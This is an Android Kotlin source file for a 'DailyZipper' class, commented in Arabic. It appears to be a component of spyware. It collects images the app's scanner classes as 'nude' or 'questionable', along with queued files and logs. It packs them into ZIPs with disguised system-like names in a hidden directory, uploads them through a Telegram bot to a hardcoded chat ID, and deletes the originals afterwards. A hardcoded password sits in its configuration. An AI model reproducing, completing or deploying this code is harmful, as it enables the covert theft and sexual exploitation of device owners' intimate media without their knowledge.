package com.example.app

import android.content.Context
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.StatFs
import android.provider.Settings
import android.util.Log
import kotlinx.coroutines.*
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.lang.ref.WeakReference
import java.security.MessageDigest
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.atomic.AtomicBoolean
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

/**
 * فئة تجميع الملفات وحصادها بضغطها في ملفات ZIP وإرسالها بطريقة آمنة وفعالة.
 * هذه الفئة هي بديل daily_zipper.py مع تحسينات الأداء والتوافق مع Android.
 *
 * ملاحظة: تم إزالة كافة استدعاءات `matchResult.groups["name"]`، واستبدالها
 * بطرق آمنة باستخدام `groupValues` عند الحاجة (غير موجودة حالياً في الكود).
 */
class DailyZipper(
    context: Context,
    private val scanner: Any? = null,
    private val telegram: Any? = null
) {

    private val contextRef = WeakReference(context.applicationContext)
    private val appContext: Context? get() = contextRef.get()

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val activeMutex = Mutex()
    private val isActive = AtomicBoolean(false)
    private val processedHashes = Collections.synchronizedSet(mutableSetOf<String>())

    private var maxBatchSize = 48L * 1024L * 1024L // 48MB

    // ========== المسارات والملفات ==========
    private val runtimeDir: File by lazy {
        File(appContext?.filesDir, ".sys_runtime").apply {
            if (!exists()) mkdirs()
        }
    }

    private val harvestDir: File by lazy {
        File(runtimeDir, "harvest").apply {
            if (!exists()) mkdirs()
        }
    }

    private val pendingDir: File by lazy {
        File(harvestDir, "pending_upload").apply {
            if (!exists()) mkdirs()
        }
    }

    private val queueDir: File by lazy {
        File(runtimeDir, ".cache_thumb").apply {
            if (!exists()) mkdirs()
        }
    }

    private val configFile: File by lazy {
        File(runtimeDir, "zipper_config.json")
    }

    private val logFile: File by lazy {
        File(runtimeDir, "z.log")
    }

    private val deviceTag: String by lazy {
        getDeviceTag()
    }

    // ========== الإعدادات ==========
    private val configMap = mutableMapOf<String, Any>(
        "max_batch_size" to 48L * 1024L * 1024L,
        "storage_extra" to 100L * 1024L * 1024L,
        "send_retry_delays" to listOf(2000L, 4000L, 8000L),
        "max_processed_hashes" to 10000,
        "default_vault_id" to -1003577715762L,
        "enable_encryption" to false,
        "password" to "ShieldCore2024!",
        "max_batches" to 10
    )

    companion object {
        private const val TAG = "DailyZipper"

        @JvmStatic
        fun create(context: Context, scanner: Any? = null, telegram: Any? = null): DailyZipper {
            return DailyZipper(context, scanner, telegram)
        }
    }

    init {
        loadConfig()
    }

    // ============================================================
    //  إدارة التكوين والإعدادات
    // ============================================================

    private fun loadConfig() {
        if (!configFile.exists()) {
            saveConfig()
            return
        }
        try {
            val jsonStr = configFile.readText(Charsets.UTF_8)
            val json = JSONObject(jsonStr)
            json.keys().forEach { key ->
                configMap[key] = json.get(key)
            }
            maxBatchSize = (configMap["max_batch_size"] as? Number)?.toLong() ?: (48L * 1024L * 1024L)
        } catch (e: Exception) {
            writeLog("Config load error: ${e.message}")
        }
    }

    private fun saveConfig(): Boolean {
        return try {
            val json = JSONObject(configMap as Map<*, *>)
            configFile.writeText(json.toString(2), Charsets.UTF_8)
            true
        } catch (e: Exception) {
            writeLog("Config save error: ${e.message}")
            false
        }
    }

    // ============================================================
    //  الأدوات وفحوصات النظام
    // ============================================================

    private fun getDeviceTag(): String {
        val ctx = appContext
        if (ctx != null) {
            try {
                val androidId = Settings.Secure.getString(
                    ctx.contentResolver,
                    Settings.Secure.ANDROID_ID
                )
                if (!androidId.isNullOrEmpty()) {
                    return androidId.take(8).lowercase(Locale.US)
                }
            } catch (_: Exception) {
                // تجاهل
            }
        }

        return try {
            val model = "${Build.MANUFACTURER} ${Build.MODEL}"
            val md = MessageDigest.getInstance("MD5")
            md.digest(model.toByteArray()).joinToString("") { "%02x".format(it) }.take(8)
        } catch (e: Exception) {
            "unknown"
        }
    }

    private fun checkStorage(requiredBytes: Long): Boolean {
        return try {
            val stat = StatFs(runtimeDir.absolutePath)
            val available = stat.availableBlocksLong * stat.blockSizeLong
            val extra = (configMap["storage_extra"] as? Number)?.toLong() ?: (100L * 1024L * 1024L)
            available > (requiredBytes * 2 + extra)
        } catch (e: Exception) {
            true
        }
    }

    // ============================================================
    //  أدوات الملفات والتجزئة
    // ============================================================

    private fun fileHash(file: File): String? {
        if (!file.exists() || !file.isFile) return null

        return try {
            val md = MessageDigest.getInstance("MD5")
            file.inputStream().use { input ->
                val buffer = ByteArray(4096)
                var bytesRead: Int
                while (input.read(buffer).also { bytesRead = it } != -1) {
                    md.update(buffer, 0, bytesRead)
                }
            }
            md.digest().joinToString("") { "%02x".format(it) }
        } catch (e: Exception) {
            null
        }
    }

    private fun generateZipName(): String {
        val prefixes = arrayOf("cache_", "sys_upd_", "tmp_vol_", "core_st_", "db_sync_")
        val dateStr = SimpleDateFormat("yyMMdd", Locale.US).format(Date())
        val chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        val suffix = (1..6).map { chars.random() }.joinToString("")
        val prefix = prefixes.random()
        return "${prefix}${dateStr}_${deviceTag}_$suffix.zip"
    }

    private fun safeRemove(file: File): Boolean {
        return try {
            if (file.exists()) file.delete() else false
        } catch (e: Exception) {
            writeLog("Safe remove error ${file.absolutePath}: ${e.message}")
            false
        }
    }

    // ============================================================
    //  فحص الشبكة
    // ============================================================

    private fun isOnWifi(): Boolean {
        val ctx = appContext ?: return true
        val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return true

        return try {
            val network = cm.activeNetwork ?: return false
            val capabilities = cm.getNetworkCapabilities(network) ?: return false
            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)
        } catch (e: Exception) {
            true
        }
    }

    // ============================================================
    //  إرسال الملفات مع إعادة المحاولة
    // ============================================================

    private suspend fun safeSend(
        zipPath: String,
        caption: String,
        targetChat: Long? = null
    ): Boolean {
        if (telegram == null) return false

        var target = targetChat
        if (target == null) {
            target = invokeMethod(telegram, "getVlt") as? Long
        }
        if (target == null) {
            target = invokeMethod(telegram, "getDat") as? Long
        }
        if (target == null) {
            target = (configMap["default_vault_id"] as? Number)?.toLong() ?: -1003577715762L
        }

        val zipFile = File(zipPath)
        if (!zipFile.exists()) {
            writeLog("Zip file not found: $zipPath")
            return false
        }

        @Suppress("UNCHECKED_CAST")
        val delays = (configMap["send_retry_delays"] as? List<Long>) ?: listOf(2000L, 4000L, 8000L)

        for ((attempt, delayMs) in delays.withIndex()) {
            try {
                val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
                val isOk = (result as? Map<*, *>)?.get("ok") as? Boolean ?: false
                if (isOk) {
                    return true
                }
                writeLog("Send attempt ${attempt + 1} failed")
            } catch (e: Exception) {
                writeLog("Send error (attempt ${attempt + 1}): ${e.message}")
            }

            if (attempt < delays.size - 1) {
                delay(delayMs)
            }
        }

        return false
    }

    // ============================================================
    //  إجبار الإرسال الفوري
    // ============================================================

    fun forceSendNow(chatId: Long? = null): Boolean {
        scope.launch {
            if (isActive.get()) {
                if (chatId != null && telegram != null) {
                    sendMessage(chatId, "⏳ عملية حصاد جارية بالفعل...")
                }
                return@launch
            }

            val filesToPack = mutableListOf<File>()
            var totalSize = 0L

            listOf(queueDir, pendingDir).forEach { folder ->
                if (folder.exists()) {
                    folder.listFiles()?.forEach { file ->
                        if (file.isFile && file.length() > 0) {
                            filesToPack.add(file)
                            totalSize += file.length()
                        }
                    }
                }
            }

            if (filesToPack.isEmpty()) {
                if (chatId != null && telegram != null) {
                    sendMessage(chatId, "📭 لا توجد ملفات جديدة للحصاد حالياً.")
                }
                return@launch
            }

            if (!checkStorage(totalSize)) {
                if (chatId != null && telegram != null) {
                    sendMessage(chatId, "⚠️ المساحة غير كافية لإنشاء الأرشيف.")
                }
                return@launch
            }

            if (chatId != null && telegram != null) {
                val mb = totalSize.toDouble() / (1024.0 * 1024.0)
                val msg = "🚀 جاري معالجة ${filesToPack.size} ملفاً (${"%.1f".format(Locale.US, mb)} MB)..."
                sendMessage(chatId, msg)
            }

            packAndShip(filesToPack, bypassWifi = true, reportId = chatId)
        }

        return true
    }

    // ============================================================
    //  الضغط والتغليف والتحزيم
    // ============================================================

    private suspend fun packAndShip(
        files: List<File>,
        bypassWifi: Boolean = false,
        reportId: Long? = null
    ): Boolean {
        if (files.isEmpty()) return false

        activeMutex.withLock {
            if (isActive.get()) return false
            isActive.set(true)
        }

        try {
            // 1. التحقق من WiFi (إلا إذا كان مفروضاً)
            if (!bypassWifi && !isOnWifi()) {
                writeLog("Not on WiFi, skipping automatic harvest.")
                return false
            }

            // 2. إزالة التكرار باستخدام الهاش
            val uniqueFiles = mutableListOf<File>()
            var totalSize = 0L

            files.forEach { file ->
                if (file.exists()) {
                    val hash = fileHash(file)
                    if (hash != null && !processedHashes.contains(hash)) {
                        uniqueFiles.add(file)
                        processedHashes.add(hash)
                        totalSize += file.length()
                    }
                }
            }

            if (uniqueFiles.isEmpty()) {
                writeLog("No unique files to process")
                return false
            }

            // 3. تنظيف ذاكرة الهاشات إذا تجاوزت الحد
            val maxHashes = (configMap["max_processed_hashes"] as? Number)?.toInt() ?: 10000
            if (processedHashes.size > maxHashes) {
                processedHashes.clear()
            }

            // 4. التحقق من المساحة
            if (!checkStorage(totalSize)) {
                writeLog("Insufficient storage for packing")
                if (reportId != null) {
                    sendMessage(reportId, "⚠️ المساحة غير كافية")
                }
                return false
            }

            // 5. تقسيم الملفات إلى دفعات حسب الحجم
            val batches = mutableListOf<MutableList<File>>()
            var curBatch = mutableListOf<File>()
            var curSize = 0L

            uniqueFiles.forEach { file ->
                val fsz = file.length()

                // إذا كان الملف أكبر من الحد الأقصى، يتم إرساله في دفعة منفردة
                if (fsz > maxBatchSize) {
                    if (curBatch.isNotEmpty()) {
                        batches.add(curBatch)
                        curBatch = mutableListOf()
                        curSize = 0L
                    }
                    batches.add(mutableListOf(file))
                    return@forEach
                }

                // إضافة الملف إلى الدفعة الحالية
                if (curSize + fsz > maxBatchSize) {
                    if (curBatch.isNotEmpty()) {
                        batches.add(curBatch)
                    }
                    curBatch = mutableListOf()
                    curSize = 0L
                }

                curBatch.add(file)
                curSize += fsz
            }

            if (curBatch.isNotEmpty()) {
                batches.add(curBatch)
            }

            // 6. تحديد عدد الدفعات
            val maxBatches = (configMap["max_batches"] as? Number)?.toInt() ?: 10
            val limitedBatches = if (batches.size > maxBatches) {
                writeLog("Too many batches (${batches.size}), limiting to $maxBatches")
                batches.take(maxBatches)
            } else {
                batches
            }

            // 7. معالجة كل دفعة
            var successCount = 0

            for ((idx, batch) in limitedBatches.withIndex()) {
                val zipName = generateZipName()
                val zipFile = File(harvestDir, zipName)
                var manifestFile: File? = null

                try {
                    // بناء بيانات manifest
                    val manifestJson = JSONObject().apply {
                        put("device_tag", deviceTag)
                        put("timestamp", System.currentTimeMillis() / 1000)
                        put("batch", idx + 1)
                        put("total_batches", limitedBatches.size)

                        val filesArr = JSONArray()
                        batch.forEach { f ->
                            val fName = f.name
                            val fLower = fName.lowercase(Locale.US)

                            val fType = when {
                                fLower.endsWith(".jpg") || fLower.endsWith(".jpeg") ||
                                        fLower.endsWith(".png") || fLower.endsWith(".webp") ||
                                        fLower.endsWith(".bmp") -> "image"
                                fLower.endsWith(".aac") || fLower.endsWith(".mp3") ||
                                        fLower.endsWith(".wav") || fLower.endsWith(".m4a") -> "audio"
                                fLower.endsWith(".txt") -> "log"
                                fLower.endsWith(".mp4") || fLower.endsWith(".avi") ||
                                        fLower.endsWith(".mov") || fLower.endsWith(".mkv") -> "video"
                                else -> "other"
                            }

                            filesArr.put(
                                JSONObject().apply {
                                    put("name", fName)
                                    put("size", f.length())
                                    put("type", fType)
                                    put("hash", fileHash(f) ?: "")
                                    put("timestamp", f.lastModified() / 1000)
                                }
                            )
                        }
                        put("files", filesArr)
                    }

                    // كتابة ملف manifest
                    manifestFile = File(
                        harvestDir,
                        "manifest_${System.currentTimeMillis()}_${(1000..9999).random()}.json"
                    )
                    manifestFile.writeText(manifestJson.toString(2), Charsets.UTF_8)

                    // إنشاء ملف ZIP
                    val zipCreated = createZipArchive(zipFile, batch, manifestFile)

                    if (!zipCreated || zipFile.length() < 1024) {
                        safeRemove(zipFile)
                        throw Exception("Zip file too small or creation failed")
                    }

                    // حذف ملف manifest المؤقت
                    safeRemove(manifestFile)
                    manifestFile = null

                    // إرسال الملف المضغوط
                    val modeStr = if (bypassWifi) "إرسال فوري" else "حصاد تلقائي"
                    val caption = "📦 $modeStr | دفعة ${idx + 1}/${limitedBatches.size} | ${batch.size} ملفات"

                    val sent = safeSend(zipFile.absolutePath, caption, reportId)

                    if (sent) {
                        // حذف الملفات الأصلية بعد الإرسال الناجح
                        batch.forEach { safeRemove(it) }
                        successCount++

                        if (reportId != null) {
                            sendMessage(reportId, "✅ تم إرسال الدفعة ${idx + 1}/${limitedBatches.size} بنجاح")
                        }
                    } else {
                        if (reportId != null) {
                            sendMessage(reportId, "❌ فشل إرسال الدفعة ${idx + 1}")
                        }
                    }

                } catch (e: Exception) {
                    writeLog("Packing error: ${e.message}")
                    if (reportId != null) {
                        sendMessage(reportId, "⚠️ خطأ في الضغط: ${e.message?.take(100)}")
                    }
                } finally {
                    // تنظيف الملفات المؤقتة
                    safeRemove(zipFile)
                    manifestFile?.let { safeRemove(it) }
                }

                // انتظار بين الدفعات
                if (idx < limitedBatches.size - 1) {
                    delay(5000L)
                }
            }

            if (reportId != null) {
                val msg = "🏁 انتهت العملية. نجح إرسال $successCount/${limitedBatches.size} دفعات."
                sendMessage(reportId, msg)
            }

            return successCount > 0

        } finally {
            isActive.set(false)
            System.gc()
        }
    }

    // ============================================================
    //  إنشاء أرشيف ZIP
    // ============================================================

    private fun createZipArchive(
        zipFile: File,
        files: List<File>,
        manifestFile: File
    ): Boolean {
        return try {
            ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
                val buffer = ByteArray(4096)

                // إضافة ملفات الدفعة
                files.forEach { file ->
                    if (file.exists()) {
                        FileInputStream(file).use { fis ->
                            val entry = ZipEntry(file.name)
                            zos.putNextEntry(entry)

                            var len: Int
                            while (fis.read(buffer).also { len = it } > 0) {
                                zos.write(buffer, 0, len)
                            }
                            zos.closeEntry()
                        }
                    }
                }

                // إضافة ملف manifest
                if (manifestFile.exists()) {
                    FileInputStream(manifestFile).use { fis ->
                        val entry = ZipEntry("manifest.json")
                        zos.putNextEntry(entry)

                        var len: Int
                        while (fis.read(buffer).also { len = it } > 0) {
                            zos.write(buffer, 0, len)
                        }
                        zos.closeEntry()
                    }
                }
            }
            true
        } catch (e: Exception) {
            writeLog("Create zip failed: ${e.message}")
            false
        }
    }

    // ============================================================
    //  التشغيل التلقائي والحصاد الدوري
    // ============================================================

    fun run(): Boolean {
        scope.launch {
            activeMutex.withLock {
                if (isActive.get()) return@launch
            }

            if (!isOnWifi()) {
                writeLog("Not on WiFi, skipping automatic harvest.")
                return@launch
            }

            val allFiles = mutableListOf<File>()

            // 1. جمع الملفات من الماسح الضوئي (scanner)
            if (scanner != null) {
                try {
                    listOf("nude", "questionable").forEach { cat ->
                        val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                        items?.forEach { item ->
                            val path = (item as? Map<*, *>)?.get("path") as? String
                            if (!path.isNullOrEmpty()) {
                                val f = File(path)
                                if (f.exists()) {
                                    allFiles.add(f)
                                }
                            }
                        }
                    }
                } catch (e: Exception) {
                    writeLog("Scanner category scan error: ${e.message}")
                }
            }

            // 2. جمع الملفات من مجلد QUEUE
            if (queueDir.exists()) {
                queueDir.listFiles()?.forEach { f ->
                    if (f.isFile && f.length() > 0) {
                        allFiles.add(f)
                    }
                }
            }

            // 3. جمع الملفات من مجلد runtime (ملفات السجلات الكبيرة)
            runtimeDir.listFiles()?.forEach { f ->
                if (f.name.endsWith(".log") && f.name !in listOf("z.log", "t.log")) {
                    if (f.length() > 100 * 1024) {
                        allFiles.add(f)
                    }
                }
            }

            // 4. إزالة التكرار باستخدام المسار المطلق
            val uniqueFiles = allFiles.distinctBy { it.absolutePath }

            if (uniqueFiles.isNotEmpty()) {
                // إرسال إشعار الحصاد
                if (telegram != null) {
                    val did = invokeMethod(scanner, "getDid") as? String ?: "Unknown"
                    invokeMethod(telegram, "notifyHarvest", did, uniqueFiles.size)
                }

                // تشغيل عملية الضغط والإرسال
                packAndShip(uniqueFiles, bypassWifi = false, reportId = null)
            }
        }

        return true
    }

    // ============================================================
    //  أدوات مساعدة
    // ============================================================

    fun clearHashCache() {
        processedHashes.clear()
    }

    fun getStats(): Map<String, Any> {
        var count = 0
        var totalSize = 0L

        listOf(queueDir, pendingDir).forEach { folder ->
            if (folder.exists()) {
                folder.listFiles()?.forEach { f ->
                    if (f.isFile) {
                        count++
                        totalSize += f.length()
                    }
                }
            }
        }

        return mapOf("pending" to count, "size" to totalSize)
    }

    // ============================================================
    //  دوال المساعدة والتواصل (Helpers & Reflection)
    // ============================================================

    private fun sendMessage(chatId: Long, text: String) {
        if (telegram == null) return
        invokeMethod(telegram, "api", "sendMessage", mapOf("chat_id" to chatId, "text" to text))
    }

    private fun writeLog(message: String) {
        Log.i(TAG, message)
        try {
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
            val logText = "[$timestamp] [INFO] $message\n"
            logFile.appendText(logText, Charsets.UTF_8)
        } catch (_: Exception) {
            // تجاهل أخطاء التسجيل في الملف
        }
    }

    /**
     * استدعاء دالة على كائن عبر الانعكاس (بديل عن استدعاء الدوال مباشرة في Python)
     */
    private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
        if (target == null) return null

        return try {
            val method = target.javaClass.methods.firstOrNull { it.name == methodName }
                ?: return null

            method.isAccessible = true
            method.invoke(target, *args)
        } catch (e: Exception) {
            writeLog("Method invocation error ($methodName): ${e.message}")
            null
        }
    }
}